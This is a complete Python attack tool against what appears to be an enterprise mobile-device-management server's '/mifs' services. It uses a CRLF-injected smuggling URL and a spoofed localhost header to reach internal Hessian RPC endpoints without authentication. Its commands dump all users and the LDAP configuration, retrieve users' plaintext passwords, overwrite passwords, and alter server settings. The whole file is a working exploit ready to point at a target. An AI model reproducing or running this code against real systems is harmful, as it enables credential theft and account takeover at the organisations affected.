#!/usr/bin/python3

import requests
from pyhessian.encoder import encode_object
from pyhessian.protocol import Call, Binary, Fault, Object, object_factory
from pyhessian.parser import Parser, ParseError
import urllib3
import json
import datetime
from sys import stderr
import typer
from typing_extensions import Annotated


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def log(s):
    stderr.write(f"{s}\n")


class FOMO:
    SMUGGLE_TEMPLATE = "{TARGET_URL}/ca/smuggle%3fa%20HTTP/1.1%0aUser-Agent:Mozilla%0aHost:127.0.0.1%0a%0aPOST%20/mifs/services/{service_name}%20HTTP/1.1%0aX-Forwarded-For:127.0.0.1%0aA:B"

    RESYNC_URL = "{TARGET_URL}/mifs/status/status.html"

    RESYNC_URL_404 = "{TARGET_URL}/mifs/status/debug.html"

    mi_app = typer.Typer(name="")

    def __init__(
        self,
        target_url: Annotated[str, typer.Option("-t", help="The target URL", rich_help_panel="General options")],
        http_proxy: Annotated[str, typer.Option("-x", help="HTTP proxy", rich_help_panel="General options")] = None,
        user_agent: Annotated[str, typer.Option("-A", help="User-Agent", rich_help_panel="General options")] = "Mozilla/5.0",
    ):
        self.TARGET_URL = target_url
        self.XFF = "X-Forwarded-For:127.0.0.1"

        self.RESYNC_URL = f"{self.TARGET_URL}/mifs/status/status.html"

        self.RESYNC_URL_404 = f"{self.TARGET_URL}/mifs/status/debug.html"

        self.resync_attempts = 10

        self.s = requests.session()
        self.s.headers["User-Agent"] = user_agent
        self.s.verify = False
        self.s.proxies = {"http": http_proxy, "https": http_proxy} if http_proxy else None
        self.mi_app.add_typer(app)

    @staticmethod
    def get_app():
        mi_app = typer.Typer(name="")
        return mi_app

    def __dump_hessian_result(self, data):
        class BytesEncoder(json.JSONEncoder):
            def default(self, obj):
                if isinstance(obj, bytes):
                    return obj.decode("utf-8")
                elif isinstance(obj, Binary):
                    return obj.value.decode()
                elif isinstance(obj, Fault):
                    return obj.message
                elif isinstance(obj, datetime.datetime):
                    return obj.strftime("%m/%d/%Y, %H:%M:%S")
                else:
                    try:
                        return obj.__dict__
                    except:
                        return None
                return json.JSONEncoder.default(self, obj)

        try:
            r_obj = Parser().parse_string(data)
        except ParseError:
            log(f"[!] ERROR : Got a non-Hessian reply, too much desync ? data_len={len(data)} data={data}")
            exit(0)
        log(f"[+] Got Hessian reply with object of type {type(r_obj.value).__name__}")
        r = list()
        if hasattr(r_obj.value, "resultList"):
            for result in r_obj.value.resultList:
                r.append(result.__dict__)
        else:
            r.append(r_obj.value)
        return json.dumps(r, cls=BytesEncoder)

    def _do_smuggle(self, service_name, payload):
        final_url = self.SMUGGLE_TEMPLATE.format(**(self.__dict__ | locals()))
        log(f"[*] Calling : {final_url}")
        r = self.s.post(url=final_url, data=payload, headers={"Content-Type": "application/x-hessian"})
        for _ in range(self.resync_attempts):
            r = self.s.get(url=self.RESYNC_URL_404)
            if r.status_code != 404:
                return self.__dump_hessian_result(r.content)


fomo = None


def main(
    target: Annotated[str, typer.Option("-t", help="The target URL", rich_help_panel="General options")],
    http_proxy: Annotated[str, typer.Option("-x", help="HTTP proxy", rich_help_panel="General options", show_default="None")] = None,
    user_agent: Annotated[str, typer.Option("-A", help="User-Agent", rich_help_panel="General options")] = "Mozilla/5.0",
):
    global fomo
    fomo = FOMO(target, http_proxy, user_agent)


app = typer.Typer(callback=main, add_completion=False)


@app.command(name="getAllUsers", help="Dump Users")
def getAllUsers():
    print(fomo._do_smuggle("UserService", encode_object(Call("getAllUsers", args=[], version=2))))


@app.command(name="findLdapUsers", help="")
def findLdapUsers():
    print(fomo._do_smuggle("UserService", encode_object(Call("findLdapUsers", args=[], version=2))))


@app.command(name="retrieveUserPassword", help="Retrieve plaintext password of a user")
def retrieveUserPassword(principal):
    print(fomo._do_smuggle("UserService", encode_object(Call("retrieveUserPassword", args=[principal], version=2))))


@app.command(name="storeUserPassword", help="Change password of a user")
def storeUserPassword(principal, password):
    print(fomo._do_smuggle("UserService", encode_object(Call("storeUserPassword", args=[principal, password], version=2))))


@app.command(name="getLDAPConfigs", help="Dump the LDAP configuration")
def getLDAPConfigs():
    print(fomo._do_smuggle("LDAPService", encode_object(Call("getLDAPConfigs", args=[], version=2))))


@app.command(name="getSettings", help="Get multiple settings by ID (e.g 28,409)")
def getSettings(settings_csv):
    print(settings_csv.split(","))
    print(fomo._do_smuggle("SettingsService", encode_object(Call("getSettings", args=[settings_csv.split(",")], version=2))))


@app.command(name="getSettingsByProperty", help="e.g saveUserPassword,enterpriseName")
def getSettingsByProperty(settings_csv):
    print(fomo._do_smuggle("SettingsService", encode_object(Call("getSettingsByProperty", args=[settings_csv.split(",")], version=2))))


@app.command(name="setSaveUserPassword", help="Multiple settings by property (e.g saveUserPassword,feature.flag.secret )")
def setSaveUserPassword(value):
    dto = object_factory("com.mi.mifs.dto.MISettingsDTO", property="saveUserPassword", value=value)
    print(fomo._do_smuggle("SettingsService", encode_object(Call("saveOrUpdate", args=["zeubi", [dto]], version=2))))


if __name__ == "__main__":
    app()
